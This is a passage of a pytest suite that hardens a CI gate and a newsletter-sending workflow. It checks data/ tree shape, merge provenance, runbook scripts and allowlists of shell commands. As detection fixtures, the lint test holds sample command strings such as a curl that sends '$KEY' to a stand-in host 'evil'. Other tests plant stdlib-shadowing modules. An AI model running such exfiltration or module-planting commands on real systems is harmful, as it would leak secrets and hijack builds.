def test_the_gate_accepts_todays_data_tree(tmp_path, loc):
    """The repository's own committed data/ (HEAD), as the daily run sees it."""
    tip = _git(ROOT, "rev-parse", "HEAD")
    r, out, called = _run_gate(ROOT, tmp_path, tip, env_over=LOCALES[loc])
    assert r.returncode == 0 and out == {"sha": tip, "verified": "false"}, r.stdout + r.stderr


@pytest.mark.parametrize("case,loc", BAD_LOCALE_CASES, ids=[f"{c}-{loc}" for c, loc in BAD_LOCALE_CASES])
def test_the_gate_refuses_anything_else_under_data(tmp_path, case, loc):
    """Phase 0 on main: refused before the baseline check, so no build, deploy or note, and no PR read; whatever the
    locale (S-1); the log's ::error:: lines carry only printable ASCII, never a raw name."""
    _, r, out, called = _shape_check(tmp_path, SHAPE_BAD[case], env_over=LOCALES[loc])
    assert r.returncode == 2 and out == {} and not called, r.stdout + r.stderr
    assert b"(I-data)" in r.stdout
    _error_lines_are_printable(r.stdout)


def test_a_refusal_names_at_most_20_entries_cleaned(tmp_path):
    bad = [("100644", b"data/n%02d\xff\x1b.html" % i) for i in range(30)]
    _, r, out, _ = _shape_check(tmp_path, [MANIFEST, *bad])
    assert r.returncode == 2
    listed = [ln for ln in r.stdout.split(b"\n") if ln.startswith(b"::error::not allowed in data/: ")]
    assert len(listed) == 20 and all(b"??.html" in ln for ln in listed), listed
    assert b"1 of 31 entries fit" in r.stdout
    _error_lines_are_printable(r.stdout)


def test_the_gate_shape_is_the_architects_literal_and_python_agrees():
    """SHAPE in the gate is I-data's literal (TAB for <TAB>); Python's bytes regex gives the same verdicts as grep."""
    doc = (ROOT / "docs" / "architecture" / "main-protect-invariant.md").read_text(encoding="utf-8")
    lit = re.search(r"`(\^100644 blob \[0-9a-f\]\{40\}<TAB>data/[^`]*)`", doc).group(1)
    assert _gate_shape() == lit.replace("<TAB>", "\t").encode()
    pat = re.compile(_gate_shape())
    sha = b"a" * 40
    for case, entries in {**SHAPE_OK, **SHAPE_BAD}.items():
        fits = all(pat.fullmatch(m.encode() + (b" commit " if m == "160000" else b" tree " if m == "040000"
                                                else b" blob ") + sha + b"\t" + p) for m, p in entries
                   if p.startswith(b"data/") or p == b"data")
        if case in SHAPE_OK:
            assert fits, case
        elif entries and case not in ("data-emptied",):
            assert not fits, case


def test_the_shape_check_runs_before_the_baseline_and_after_the_not_main_exit(tmp_path):
    """With a baseline set, a bad shape refuses before any history fetch or PR read; on another branch the gate exits
    unverified first (that run cannot push, deploy or send)."""
    (tmp_path / "a").mkdir()
    tip, r, out, called = _shape_check(tmp_path / "a", SHAPE_BAD["symlink"], baseline="b" * 40)
    assert r.returncode == 2 and not called and b"(I-data)" in r.stdout
    (tmp_path / "b").mkdir()
    tip, r, out, called = _shape_check(tmp_path / "b", SHAPE_BAD["symlink"], ref="refs/heads/feature")
    assert r.returncode == 0 and out == {"sha": tip, "verified": "false"} and not called
    run = _gate_steps()[GATE_STEP]["run"]
    assert run.index("refs/heads/main") < run.index("git cat-file -t HEAD:data") \
        < run.index("git ls-tree -r -z HEAD -- data") < run.index("MAIN_PR_BASELINE")
    assert 'LC_ALL=C grep -zacE -- "$SHAPE"' in run and '[ "$matched" != "$total" ]' in run and '"$total" -lt 1' in run


def _missing_blobs(work) -> int:
    out = _git(work, "rev-list", "--objects", "--all", "--missing=print")      # --missing=print never fetches
    return sum(1 for ln in out.splitlines() if ln.startswith("?"))


@pytest.mark.parametrize("entries,ok", [(SHAPE_OK["json-yml-and-change-logs"], True), (SHAPE_BAD["symlink"], False),
                                        (SHAPE_BAD["executable"], False), (SHAPE_BAD["non-utf8-byte"], False)])
def test_the_shape_check_reads_no_blob_on_a_blob_none_partial_clone(tmp_path, entries, ok):
    """The architect's check: `git cat-file -t` and `git ls-tree -r` read tree objects only. On a --filter=blob:none
    clone with no checkout (no file contents at all) and its promisor remote made unreachable, the gate gives the
    same verdict, and every blob is still missing afterwards, so it fetched none (a lazy fetch would have failed on
    the dead remote)."""
    origin, tip = _shape_origin(tmp_path, entries)
    work = tmp_path / "work"
    _git(tmp_path, "clone", "-q", "--filter=blob:none", "--no-checkout", f"file://{origin}", str(work))
    assert _git(work, "config", "--get", "remote.origin.partialclonefilter") == "blob:none"
    before = _missing_blobs(work)
    assert before >= 2                                       # sender/x.py and every data/ blob are not here
    _git(work, "remote", "set-url", "origin", f"file://{tmp_path / 'gone.git'}")
    r, out, called = _run_gate(work, tmp_path, tip)
    assert (r.returncode == 0) == ok and r.returncode in (0, 2), r.stdout + r.stderr
    assert b"gone.git" not in r.stderr and b"fetch" not in r.stderr.lower(), r.stderr
    assert _missing_blobs(work) == before and not called


def test_the_committed_baseline_is_unset_or_a_sha():
    """Until T4.10.8 MAIN_PR_BASELINE is empty (phase 0: the note job never runs); then a sha (runbook 4.7)."""
    env = _gate_steps()[GATE_STEP]["env"]
    assert env["MAIN_PR_BASELINE"] == "" or re.fullmatch(r"[0-9a-f]{40}", env["MAIN_PR_BASELINE"])
    assert not any("MAIN_PR_BASELINE" in s.get("run", "") for j, job in WF["jobs"].items() if j != "gate"
                   for s in job["steps"])
    runbook = (ROOT / "docs" / "ops" / "morning-note.md").read_text(encoding="utf-8")
    assert "MAIN_PR_BASELINE" in runbook


def _window_step() -> str:
    runbook = (ROOT / "docs" / "ops" / "morning-note.md").read_text(encoding="utf-8")
    return runbook[runbook.index("**The baseline `MAIN_PR_BASELINE`"):runbook.index("Never move the baseline later")]


def _window_script() -> str:
    """The 4.7.1 bash block, as a person pastes it (the list indentation removed)."""
    block = _window_step().split("```bash\n", 1)[1].split("```", 1)[0]
    return "\n".join(ln[6:] if ln.startswith("      ") else ln for ln in block.splitlines()) + "\n"


def test_runbook_baseline_step_lists_who_merged_each_code_commit():
    """L-3, L-b: `%an` cannot show a bot merge, so 4.7.1 lists merged_by.type for each first-parent commit outside
    data/ in the window from where R2 was first turned on, via commits/<sha>/pulls then pulls/<n>; set -euo
    pipefail, a 40-hex start that is an ancestor of origin/main, the list in a variable, `checked N commits`; it stops
    on Bot, none, a failed read or N = 0. L-1's deferred change is named in 4.7.2 and in T4.10.8."""
    step = _window_step()
    script = _window_script()
    assert "merged_by" in step and "merged_by.type" in script and "/commits/$c/pulls" in script
    assert '"$R/pulls/$pr"' in script and "--first-parent" in script and ":(exclude)data/" in script
    assert script.startswith('bash -s "<R2-on sha>" <<\'WINDOW\'\nset -euo pipefail\n')
    assert "git merge-base --is-ancestor" in script and "^[0-9a-f]{40}$" in script
    assert "list=$(git log" in script and "for c in $list; do" in script and 'echo "checked $n commits"' in script
    assert "R2 first on: <sha>" in step and "Paste the whole output into the baseline PR" in step
    assert "L-1" in step and "T4.10.8" in step
    tasks = (ROOT / "docs" / "tasks" / "morning-note.md").read_text(encoding="utf-8")
    t8 = tasks[tasks.index("- **T4.10.8 Baseline.**"):tasks.index("Order: .1, .5 and branch A")]
    assert "L-1" in t8 and '("", "refs/heads/main")' in t8 and "refuse" in t8


_WINDOW_GH = """#!/usr/bin/env python3
import json, os, sys
a = sys.argv[1:]
types = json.loads(os.environ["TYPES"])          # {commit sha: merged_by.type, or "none" (no PR), or "FAIL"}
path = a[1]
if "/commits/" in path:
    sha = path.split("/commits/")[1].split("/")[0]
    assert os.environ["COMMIT"] == sha
    if types.get(sha) == "FAIL":
        sys.exit(1)
    print("none" if types.get(sha) == "none" else str(int(sha[:6], 16)))
else:
    num = int(path.rsplit("/", 1)[1])
    print(next(t for s, t in types.items() if s[:6] and int(s[:6], 16) == num))
"""


@pytest.mark.parametrize("case", ["ok", "bot", "none", "read-fails", "zero", "placeholder", "not-ancestor"])
def test_the_window_check_runs_and_stops_where_it_must(tmp_path, case):
    """Runs the runbook's own 4.7.1 block against a local origin and a fake gh."""
    origin, work, bindir = tmp_path / "origin.git", tmp_path / "work", tmp_path / "bin"
    _git(tmp_path, "init", "-q", "--bare", str(origin))
    _git(tmp_path, "init", "-q", str(work))
    shas = []
    for i, rel in enumerate(["sender/a.py", "data/x.json", "sender/a.py", "data/x.json", "config/site.yml"]):
        (work / rel).parent.mkdir(parents=True, exist_ok=True)
        (work / rel).write_text(f"{i}\n")
        _git(work, "add", "-A")
        _git(work, "commit", "-q", "-m", f"c{i}")
        shas.append(_git(work, "rev-parse", "HEAD"))
    _git(work, "push", "-q", f"file://{origin}", "HEAD:refs/heads/main")
    _git(work, "remote", "add", "origin", f"file://{origin}")
    start = {"zero": shas[4], "placeholder": "<R2-on sha>", "not-ancestor": "f" * 40}.get(case, shas[0])
    if case == "not-ancestor":
        _git(work, "checkout", "-q", "--orphan", "other")
        _git(work, "commit", "-q", "--allow-empty", "-m", "elsewhere")
        start = _git(work, "rev-parse", "HEAD")
    types = {shas[2]: "User", shas[4]: {"bot": "Bot", "none": "none", "read-fails": "FAIL"}.get(case, "User")}
    bindir.mkdir()
    (bindir / "gh").write_text(_WINDOW_GH)
    (bindir / "gh").chmod(0o755)
    script = _window_script().replace('"<R2-on sha>"', f'"{start}"', 1)
    env = {**os.environ, "PATH": f"{bindir}:{os.environ['PATH']}", "TYPES": json.dumps(types),
           "GIT_CONFIG_GLOBAL": "/dev/null"}
    r = subprocess.run(["bash", "-c", script], cwd=work, env=env, capture_output=True, text=True)
    if case == "ok":
        assert r.returncode == 0 and r.stdout.splitlines()[-1] == "checked 2 commits", r.stdout + r.stderr
        assert r.stdout.splitlines()[:2] == [f"{shas[4]} PR #{int(shas[4][:6], 16)} merged_by.type=User",
                                             f"{shas[2]} PR #{int(shas[2][:6], 16)} merged_by.type=User"]
    else:
        assert r.returncode == 1 and "STOP:" in r.stdout, r.stdout + r.stderr
        assert "checked 2 commits" not in r.stdout


@pytest.mark.parametrize("case", ["canary", "other-file", "other-pr", "other-sha"])
def test_the_window_check_lets_only_the_v1_probe_canary_merge_through(tmp_path, case):
    """ADR 0010 / T4.11.4: 3ef440a (PR #40, the V1 probe's bot merge of .github/workflows/v1-canary.yml) is the one
    known Bot merge in the window. The block passes it only when the sha, the PR number and the file list all match;
    any other Bot merge still stops. The real sha is swapped for a local commit to run it."""
    script = _window_script()
    assert "known=3ef440aea9e5ce7374cdb789a05d646d74a91ac3; known_pr=40" in script
    origin, work, bindir = tmp_path / "origin.git", tmp_path / "work", tmp_path / "bin"
    _git(tmp_path, "init", "-q", "--bare", str(origin))
    _git(tmp_path, "init", "-q", str(work))
    shas = []
    canary = "sender/a.py" if case == "other-file" else ".github/workflows/v1-canary.yml"
    for i, rel in enumerate(["sender/a.py", canary, "sender/b.py"]):
        (work / rel).parent.mkdir(parents=True, exist_ok=True)
        (work / rel).write_text(f"{i}\n")
        _git(work, "add", "-A")
        _git(work, "commit", "-q", "-m", f"c{i}")
        shas.append(_git(work, "rev-parse", "HEAD"))
    _git(work, "push", "-q", f"file://{origin}", "HEAD:refs/heads/main")
    _git(work, "remote", "add", "origin", f"file://{origin}")
    known = "e" * 40 if case == "other-sha" else shas[1]
    pr = int(shas[1][:6], 16) + (1 if case == "other-pr" else 0)
    types = {shas[1]: "Bot", shas[2]: "User"}
    bindir.mkdir()
    (bindir / "gh").write_text(_WINDOW_GH)
    (bindir / "gh").chmod(0o755)
    script = script.replace('"<R2-on sha>"', f'"{shas[0]}"', 1).replace(
        "known=3ef440aea9e5ce7374cdb789a05d646d74a91ac3; known_pr=40", f"known={known}; known_pr={pr}")
    env = {**os.environ, "PATH": f"{bindir}:{os.environ['PATH']}", "TYPES": json.dumps(types),
           "GIT_CONFIG_GLOBAL": "/dev/null"}
    r = subprocess.run(["bash", "-c", script], cwd=work, env=env, capture_output=True, text=True)
    if case == "canary":
        assert r.returncode == 0 and r.stdout.splitlines()[-1] == "checked 2 commits", r.stdout + r.stderr
        assert f"KNOWN EXCEPTION: {shas[1]} is PR #{pr}" in r.stdout
    else:
        assert r.returncode == 1 and f"STOP: {shas[1]} was not merged by a person" in r.stdout, r.stdout + r.stderr
        assert "KNOWN EXCEPTION" not in r.stdout


def test_the_runbook_quotes_the_gates_data_refusals_exactly():
    """runbook/gate-message-drift: every data/ refusal and the history-read refusal the gate prints, word for word
    (up to the first variable), is in "When the gate fails"."""
    run = _gate_steps()[GATE_STEP]["run"]
    msgs = re.findall(r'refuse "([^"]*)"', run)
    msgs += re.findall(r'echo "::error::(not allowed in data/: )', run)
    wanted = [m.split("$", 1)[0] for m in msgs if m.startswith(("data/", "could not", "not allowed in data/"))]
    assert len(wanted) >= 6, wanted
    runbook = (ROOT / "docs" / "ops" / "morning-note.md").read_text(encoding="utf-8")
    section = " ".join(runbook[runbook.index("## When the gate fails"):].split("\n## ", 1)[0].split())
    for m in wanted:
        assert " ".join(m.split()) in section, m
    assert "Restore it from the last commit whose `data/` was good" in section


def test_the_gate_fails_closed_when_github_cannot_be_read(tmp_path):
    code, calls, _, out = _pr_check(tmp_path, [("commit", "A", _ALL)], {"A": [_pr("A")]}, gh_fail=True)
    assert code != 0 and len(calls) == 1 and out == {}


def test_the_gate_jq_filters_with_real_jq():
    """The --jq expressions gh evaluates (gojq), run through jq where it is installed."""
    _need_jq()
    for pr, want in (({"merged_by": {"type": "User"}, "head": {"sha": "h"}, "merged_at": "t"}, "User h t"),
                     ({"merged_by": {"type": "Bot"}, "head": {"sha": "h"}, "merged_at": "t"}, "Bot h t"),
                     ({"merged_by": None, "head": None, "merged_at": None}, "none none none"), ({}, "none none none")):
        r = subprocess.run(["jq", "-r", PULL_JQ], input=json.dumps(pr), capture_output=True, text=True, check=True)
        assert r.stdout.strip() == want, pr
    sha = "a" * 40
    one, two = _pr(sha), _pr(sha)
    for prs, want in (([one], str(one["number"])), ([_pr(sha, merged=False)], ""), ([_pr(sha, base="dev")], ""),
                      ([_pr("b" * 40)], ""), ([], ""), ([_pr("b" * 40), one], str(one["number"])),
                      ([one, two], f"{one['number']} {two['number']}")):     # two: not one number, so refused
        r = subprocess.run(["jq", "-r", PR_JQ], input=json.dumps(prs), capture_output=True, text=True, check=True,
                           env={**os.environ, "COMMIT": sha})
        assert r.stdout.strip() == want, prs
    h = "h" * 40
    renv = {**os.environ, "HEAD_SHA": h, "MERGED_AT": MERGED_AT}
    for reviews, want in (([_review(commit=h)], 1), ([_review(commit=h, state="APPROVED", at=MERGED_AT)], 1),
                          ([_review(commit="g" * 40)], 0), ([_review(commit=h, user="Bot")], 0),
                          ([_review(commit=h, state="DISMISSED")], 0), ([_review(commit=h, state="PENDING")], 0),
                          ([_review(commit=h, at="2026-11-12T00:00:00Z")], 0), ([{**_review(commit=h),
                                                                                  "submitted_at": None}], 0),
                          ([], 0), ([_review(commit=h), _review(commit=h, state="APPROVED")], 2),
                          ([_review(commit=h, assoc="NONE")], 0), ([_review(commit=h, assoc="CONTRIBUTOR")], 0),
                          ([_review(commit=h, assoc="MEMBER")], 0), ([{**_review(commit=h), "author_association": None}], 0),
                          ([_review(commit=h, assoc="COLLABORATOR")], 1), ([_review(commit=h, assoc="OWNER")], 1)):
        r = subprocess.run(["jq", "-r", REVIEW_JQ], input=json.dumps(reviews), capture_output=True, text=True,
                           check=True, env=renv)
        assert len(r.stdout.split()) == want, reviews


def test_the_gate_is_first_read_only_and_feeds_every_job():
    jobs = WF["jobs"]
    assert list(jobs)[0] == "gate"
    gate = jobs["gate"]
    assert gate["permissions"] == {"contents": "read", "pull-requests": "read"}    # exactly the two reads
    assert "needs" not in gate and "if" not in gate and "environment" not in gate and gate["timeout-minutes"] <= 10
    assert gate["outputs"] == {"sha": "${{ steps.check.outputs.sha }}",
                               "verified": "${{ steps.check.outputs.verified }}"}
    steps = gate["steps"]
    assert [s.get("name") for s in steps] == ["Check out this run's commit", GATE_STEP]
    assert steps[0]["uses"].startswith("actions/checkout@")
    assert steps[0]["with"] == {"ref": "${{ github.sha }}", "persist-credentials": False}
    check = steps[1]
    assert check["id"] == "check" and "${{" not in check["run"]
    assert set(check["env"]) == {"GH_TOKEN", "SHA", "REF", "MAIN_PR_BASELINE"}
    assert check["env"]["GH_TOKEN"] == "${{ github.token }}" and check["env"]["SHA"] == "${{ github.sha }}"
    assert check["env"]["REF"] == "${{ github.ref }}"
    run = " ".join(check["run"].split())
    for jq in (PR_JQ, PULL_JQ, REVIEW_JQ):
        assert jq in run, jq
    assert """-- . ':(exclude)data/')""" in run and "--first-parent" in run
    # update builds exactly the gate's commit (L-A); push, deploy and note need the gate
    assert jobs["update"]["needs"] == "gate"
    co = [s for s in jobs["update"]["steps"] if "actions/checkout@" in s.get("uses", "")]
    assert len(co) == 1 and co[0]["with"]["ref"] == "${{ needs.gate.outputs.sha }}" and co[0]["id"] == "checkout"
    assert "          ref: main\n" not in TEXT
    assert jobs["push"]["needs"] == ["gate", "update"]
    assert jobs["deploy"]["needs"] == ["gate", "update", "push"]
    assert "needs.gate.result == 'success'" in _deploy_if()
    assert jobs["note"]["needs"] == ["gate", "update", "deploy"]
    assert "needs.gate.outputs.verified == 'true'" in " ".join(jobs["note"]["if"].split())
    assert _note_steps()["Check out this run's commit"]["with"]["ref"] == "${{ needs.gate.outputs.sha }}"
    # one copy of the history check: the gate's; the note job has no token and no PR check
    assert [n for n, j in jobs.items() for s in j["steps"] if "MAIN_PR_BASELINE" in (s.get("env") or {})] == ["gate"]
    assert not any("GH_TOKEN" in (s.get("env") or {}) for s in jobs["note"]["steps"])
    assert "/pulls" not in "\n".join(s.get("run", "") for s in jobs["note"]["steps"])
    assert jobs["note"]["permissions"] == {"contents": "read"}
    assert "git diff --quiet HEAD FETCH_HEAD -- sender/ config/site.yml .github/;" in _note_steps()[STALE_STEP]["run"]


GATE_COMMANDS = {"git", "grep", "gh", "wc", "tr", "verdict", "refuse"}


def test_the_gate_runs_no_file_from_the_checkout():
    """A lint, as NOTE_STEP_COMMANDS: the gate's step runs only allowlisted programs and its own two functions, never
    a file by path, a variable, source/bash/sh/eval/exec/env or an interpreter; no action but checkout."""
    run = _gate_steps()[GATE_STEP]["run"]
    words = _commands(run)
    assert not set(words) - _SHELL - GATE_COMMANDS, set(words) - _SHELL - GATE_COMMANDS
    for w in words:
        assert "/" not in w and not w.startswith("$") and w not in (
            ".", "source", "bash", "sh", "eval", "exec", "env", "node", "perl", "python", "python3"), w
    assert "git -c" not in run and "--upload-pack" not in run
    assert [s["uses"].split("@")[0] for s in WF["jobs"]["gate"]["steps"] if "uses" in s] == ["actions/checkout"]


@pytest.mark.parametrize("open_issue", ["", "7"])
def test_gate_failed_opens_or_comments_on_one_issue(tmp_path, open_issue):
    gf = WF["jobs"]["gate-failed"]
    assert gf["needs"] == "gate" and gf["permissions"] == {"issues": "write"}
    assert gf["if"] == "always() && (needs.gate.result == 'failure' || needs.gate.result == 'cancelled')"
    step = gf["steps"][0]
    assert len(gf["steps"]) == 1 and "uses" not in step
    assert step["env"]["GATE_TITLE"] == "Daily update: main history check failed"
    assert "${{" not in step["run"] and "--app github-actions" in step["run"]
    calls, body = _run_issue_step(tmp_path, step, open_issue=open_issue)
    assert calls[1].startswith("issue comment 7" if open_issue else "issue create") and len(calls) == 2
    assert "When the gate fails" in body and "last deploy" in body


# ------------------------------------------------------------------ main-protect/pr-check-path-scope: no checkout import
_QUOTED = re.compile(r""""(?:[^"\\]|\\.)*"|'[^']*'""")
_SEP = re.compile(r"\$\(|[;&|()`\n]|(?:^|\s)\{\s|(?:^|\s)\}(?=[\s;]|$)")
_SUBST = re.compile(r"\$\(|`")     # a command substitution: what runs inside it is a command
_KEYWORDS = ("if", "then", "do", "else", "elif", "while", "until", "!", "time")


def _commands(run: str) -> list:
    """The first word of every command in a run: script (comments left out; assignments and keywords skipped). A
    lint, not a boundary: it reads shell text, so it cannot see every way a command can run another program; the
    per-step allowlist below keeps the set of programs each step runs from growing unreviewed."""
    code = "\n".join(line for line in run.splitlines() if not line.lstrip().startswith("#"))
    # quoted text keeps its word characters and slashes only, so a quoted command ("$lib/x") is still seen
    code = _QUOTED.sub(lambda m: re.sub(r"[^\w/$.-]", "", m.group(0)) or "Q", code.replace("\\\n", " "))
    # a test's operands are not commands, nor an array's items, unless they hold a command substitution
    # (main-protect/lint-blind-subst: `[[ $(curl -d "$KEY" x) ]]` or `a=($(curl x))` would hide curl)
    code = re.sub(r"\[\[.*?\]\]", lambda m: m.group(0) if _SUBST.search(m.group(0)) else "[[ ]]", code)
    code = re.sub(r"\b([A-Za-z_]\w*)=\([^)]*\)", lambda m: m.group(0) if _SUBST.search(m.group(0))
                  else m.group(1) + "=", code)
    words = []
    for part in _SEP.split(code):
        toks = part.split()
        while toks and (toks[0] in _KEYWORDS or re.match(r"[A-Za-z_]\w*=", toks[0])):
            toks.pop(0)
        if toks:
            words.append(toks[0])
    return words


_SHELL = {"set", "echo", "exit", "[", "[[", "fi", "done", "for", "read", "cd", "true", "continue"}
_VERIFY_WORDS = {"find", "sort", "xargs", "sha256sum"}
# main-protect/test-launcher-coverage: the programs each note-job step may run (beyond _SHELL); a new one is a review
NOTE_STEP_COMMANDS = {
    "Mask the canary ids": set(),
    STALE_STEP: {"git"},
    STAGE_STEP: {"mktemp", "mkdir", "git", "find", "sort", "xargs", "sha256sum"},
    "Validate the plan files": _VERIFY_WORDS | {"mktemp", "python", "wc", "head", "awk"},
    "Check the plan (dry run, no secret)": _VERIFY_WORDS | {"mktemp", "python"},
    "Deliver the morning note": _VERIFY_WORDS | {"mktemp", "python"},
}


def test_every_python_in_the_note_job_is_isolated_from_the_checkout():
    """main-protect/test-launcher-coverage (a lint, not a boundary): the job that holds the key runs exactly three
    pythons, each the exact isolated launch after the digest re-check; each step runs only its allowlisted programs,
    never a file by path, a variable ("$cmd"), source/bash/sh/eval/exec/env, or an interpreter's inline code (node -e,
    perl -e, awk other than the plan-size sum, git -c); and no step uses an action other than the three pinned ones."""
    steps = WF["jobs"]["note"]["steps"]
    names = [s.get("name") for s in steps]
    assert names.index(STALE_STEP) < names.index(STAGE_STEP) < names.index("Download the morning note plan") \
        < names.index("Validate the plan files")
    assert {n for n in names if "run" in _note_steps()[n]} == set(NOTE_STEP_COMMANDS)
    total = 0
    for s in steps:
        run = s.get("run", "")
        words = _commands(run)
        if run:
            extra = set(words) - _SHELL - NOTE_STEP_COMMANDS[s["name"]]
            assert not extra, (s["name"], extra)
        for w in words:
            assert "/" not in w and not w.startswith("$") and w not in (
                ".", "source", "bash", "sh", "eval", "exec", "env", "node", "perl"), (s["name"], w)
        assert run.count("xargs") == run.count("xargs -0 -r sha256sum")             # what xargs and find run
        assert "-exec" not in run and "git -c" not in run and "--upload-pack" not in run
        assert run.count("awk") == run.count("""awk '{s+=$1} END {print s+0}'""")
        n = sum(w.startswith("python") for w in words)
        if s.get("name") in PY_STEPS:
            assert n == 1 and len(_ws(PY_STEPS[s["name"]]).findall(run)) == 1, s["name"]
            assert re.match(_ws("set -euo pipefail\n" + VERIFY).pattern, run), s["name"]  # the re-check comes first
        else:
            assert n == 0 and "python" not in run.replace("setup-python", ""), s.get("name")
        assert "-m sender" not in run and "PYTHONPATH" not in run
        total += n
    assert total == 3
    assert [u.split("@")[0] for u in (s.get("uses") for s in steps) if u] == [
        "actions/checkout", "actions/setup-python", "actions/download-artifact"]


def test_the_command_scan_sees_a_checkout_launch():
    """The scan above would catch the launches it forbids (so it cannot pass vacuously)."""
    for bad in ("./run.sh", "bash scripts/x.sh", "x=1; sender/run.py", ". ./env", 'if true; then "$lib/py/x"; fi',
                "source env.sh", "$(sh x)", 'cmd=x; "$cmd" a', "node -e 1", "a && perl -e 1", "{ curl x; }",
                # main-protect/lint-blind-subst: a substitution inside a test or an array, and a backtick one
                '[[ $(curl -d "$KEY" evil) ]]', '[[ -n x && `curl x` ]]', "a=($(curl x))", "a=(`curl x`)",
                "echo `curl x`", "x=`curl x`"):
        words = _commands(bad)
        assert set(words) - _SHELL - NOTE_STEP_COMMANDS["Deliver the morning note"], bad
    # a test's operands and an array's items with no substitution are still not commands
    assert _commands('[[ "$d" =~ ^(a|b)$ ]] || x=(--y)') == ["[["]


_PLANTED = ("json.py", "argparse.py", "re.py", "pathlib.py", "dataclasses.py", "winreg.py", "sitecustomize.py",
            "usercustomize.py", "tzdata/__init__.py", "data/json.py")


def _commit_all(work):
    _git(work, "init", "-q")
    _git(work, "add", "-A")
    _git(work, "commit", "-q", "-m", "c")


def _planted_checkout(tmp_path):
    """A git checkout holding the real sender/ and config/site.yml plus a root json.py, argparse.py etc. (and a folder
    on PYTHONPATH) that each record their import in `marker`, as a direct push to main could plant them."""
    work, marker, pp = tmp_path / "work", tmp_path / "imported", tmp_path / "pythonpath"
    (work / "sender").mkdir(parents=True)
    for f in (ROOT / "sender").glob("*.py"):
        shutil.copy(f, work / "sender" / f.name)
    (work / "config").mkdir()
    shutil.copy(ROOT / "config" / "site.yml", work / "config" / "site.yml")
    plant = f"open({str(marker)!r}, 'a').write(__name__ + '\\n')\n"
    for rel in _PLANTED:
        (work / rel).parent.mkdir(parents=True, exist_ok=True)
        (work / rel).write_text(plant)
    _commit_all(work)
    pp.mkdir()
    (pp / "json.py").write_text(plant)
    env = {**PY_ENV, "PYTHONPATH": f"{pp}:{work}", "PYTHONSTARTUP": str(work / "json.py")}
    return work, marker, env, plant


def _run_py_step(name, work, runner, lib_env, env, plan):
    return subprocess.run(["bash", "-c", _note_steps()[name]["run"]], cwd=work, capture_output=True, text=True,
                          env={**env, **lib_env, "RUNNER_TEMP": str(runner), "PLAN": str(plan),
                               "MORNING_NOTE_SEND": "true", "BUTTONDOWN_API_KEY": ""})


def test_a_planted_root_module_never_runs_in_the_note_job(tmp_path):
    """main-protect/pr-check-path-scope (N1): a root json.py/argparse.py pushed to main shadowed the standard library
    in `python -E -s -m sender deliver`, the step that holds the key. The control run proves the plant works; the
    job's own stage, plan-size, dry-run and delivery steps never import it, and leave the staged folder unchanged."""
    work, marker, env, _ = _planted_checkout(tmp_path)
    old = subprocess.run(["bash", "-c", 'python -E -s -m sender deliver --plan "$PLAN"'], cwd=work, text=True,
                         capture_output=True, env={**env, "PLAN": str(tmp_path / "none.json")})
    assert marker.exists() and old.returncode != 0                              # the old command ran the plant
    marker.unlink()
    runner = tmp_path / "runner"
    runner.mkdir()
    staged, lib_env = _stage(work, runner)
    assert staged.returncode == 0, staged.stderr
    for name in ("Check the plan (dry run, no secret)", "Deliver the morning note"):
        r = _run_py_step(name, work, runner, lib_env, env, tmp_path / "none.json")
        # the staged sender ran: it read the staged config/site.yml, then could not read the plan
        assert r.returncode == 2 and "the plan file cannot be read; nothing sent" in r.stderr, (name, r.stderr)
        assert "Traceback" not in r.stderr and "changed after it was staged" not in r.stderr
    code, plan_env = _validate_plan(tmp_path / "v", GOOD, cwd=work, env=env)
    assert code == 0 and plan_env.strip().endswith("/morning-send/2026-11-12/plan.json")
    assert not marker.exists(), marker.read_text()
    lib = Path(lib_env["NOTE_LIB"])
    assert lib.parent == runner and lib.name.startswith("note-lib.") and not list(lib.rglob("__pycache__"))


def test_the_provider_adapter_imports_under_the_isolated_launch(tmp_path):
    """main-protect/test-launcher-coverage: only a live run imports sender/buttondown.py (http.client, ssl, urllib),
    so no dry run covers it. Under the job's exact interpreter flags and staged folder, the adapter imports and
    builds its opener (ssl.create_default_context, the system trust store) without opening a connection."""
    work, marker, env, _ = _planted_checkout(tmp_path)
    runner = tmp_path / "runner"
    runner.mkdir()
    staged, lib_env = _stage(work, runner)
    assert staged.returncode == 0, staged.stderr
    code = ("import sys; sys.path.insert(0, sys.argv[1]); import ssl, socket; "
            "socket.create_connection = socket.socket = None; "                      # any connection would fail
            "from sender import buttondown; p = buttondown.Buttondown(\"k\" * 20); "
            "assert ssl.create_default_context().verify_mode == ssl.CERT_REQUIRED; "
            "assert \"site\" not in sys.modules and all(\"site-packages\" not in x for x in sys.path); "
            "print(\"ok\", repr(p), sys.version_info[:2] == tuple(int(v) for v in sys.argv[2].split(\".\")))")
    script = _PC + _PY + f"'{code}' \\\n  \"$NOTE_LIB/py\" {sys.version_info[0]}.{sys.version_info[1]}\n"
    r = subprocess.run(["bash", "-c", "set -euo pipefail\n" + script], cwd=work, capture_output=True, text=True,
                       env={**env, **lib_env, "RUNNER_TEMP": str(runner)})
    assert r.returncode == 0 and r.stdout.strip() == "ok Buttondown(...) True", r.stdout + r.stderr
    assert not marker.exists() and not list(Path(lib_env["NOTE_LIB"]).rglob("__pycache__"))


def test_the_staged_config_is_this_commits_not_the_working_folders(tmp_path):
    """main-protect/staged-lib-integrity: config/site.yml is read from the staged copy of the commit's own file; a
    working-folder edit after checkout (the plan download comes after) changes nothing."""
    work, _, env, _ = _planted_checkout(tmp_path)
    (work / "config" / "site.yml").write_text("not: [valid\n")
    runner = tmp_path / "runner"
    runner.mkdir()
    staged, lib_env = _stage(work, runner)
    assert staged.returncode == 0
    assert (Path(lib_env["NOTE_LIB"]) / "site.yml").read_bytes() == (ROOT / "config" / "site.yml").read_bytes()
    r = _run_py_step("Check the plan (dry run, no secret)", work, runner, lib_env, env, tmp_path / "none.json")
    assert r.returncode == 2 and "the plan file cannot be read; nothing sent" in r.stderr, r.stderr


@pytest.mark.parametrize("tamper", ["add-json", "add-pycache", "change-module", "change-config", "remove-module",
                                    "add-symlink", "chmod"])
def test_a_file_planted_in_the_staged_folder_after_staging_stops_the_job(tmp_path, tamper):
    """main-protect/staged-lib-integrity (L1): a write into the staged folder after staging (say a zip-slip in the plan
    download) stops every Python step before python starts, so the planted code never runs."""
    work, marker, env, plant = _planted_checkout(tmp_path)
    runner = tmp_path / "runner"
    runner.mkdir()
    staged, lib_env = _stage(work, runner)
    assert staged.returncode == 0
    lib = Path(lib_env["NOTE_LIB"])
    py = lib / "py" / "sender"
    if tamper == "add-json":
        (lib / "py" / "json.py").write_text(plant)
    elif tamper == "add-pycache":
        (py / "__pycache__").mkdir()
        (py / "__pycache__" / "deliver.cpython-312.pyc").write_bytes(b"\0" * 16)
